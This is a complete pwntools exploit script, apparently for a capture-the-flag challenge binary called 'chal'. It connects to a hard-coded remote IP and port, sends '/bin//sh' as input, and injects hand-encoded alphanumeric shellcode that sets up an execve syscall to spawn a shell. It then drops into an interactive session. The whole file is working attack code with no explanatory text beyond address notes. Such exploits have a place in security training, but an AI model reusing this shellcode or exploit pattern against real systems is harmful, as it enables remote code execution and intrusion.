from pwn import *

context.binary = './chal'
byte_601040 = 'wubbalubbadubdub' 
name = 0x601100

# strange
#shellcode = '\x52\x58\x34\x42\x50\x5B\x68\x61\x78\x61\x61\x58\x30\x23\x52\x58\x34\x43\x50\x5B\x68\x61\x70\x61\x61\x58\x30\x23\x68\x61\x70\x40\x61\x58\x35\x61\x61\x20\x61\x50\x5f\x68\x61\x61\x61\x61\x58\x35\x61\x61\x61\x61\x50\x50\x5A\x5E\x6A\x3B\x58'
shellcode = '\x52\x58\x34\x7B\x50\x5B\x68\x61\x78\x61\x61\x58\x30\x23\x52\x58\x34\x7C\x50\x5B\x68\x61\x70\x61\x61\x58\x30\x23\x68\x61\x70\x40\x61\x58\x35\x61\x61\x20\x61\x50\x5f\x68\x61\x61\x61\x61\x58\x35\x61\x61\x61\x61\x50\x50\x5A\x5E\x6A\x3B\x58'

print(len(shellcode))

r = remote('60.250.197.227', 10001)
#r = process('chal')
#gdb.attach(r)
r.sendafter('name', '/bin//sh\0')
#r.sendafter('yours?', 'a' * 7 + shellcode + byte_601040)
r.sendafter('yours?', shellcode + byte_601040)
r.interactive()

'''
0x400698: constraint
0x6010a0: shellcode
0x4006b6: jg 0x1f

0x6010bc
'''
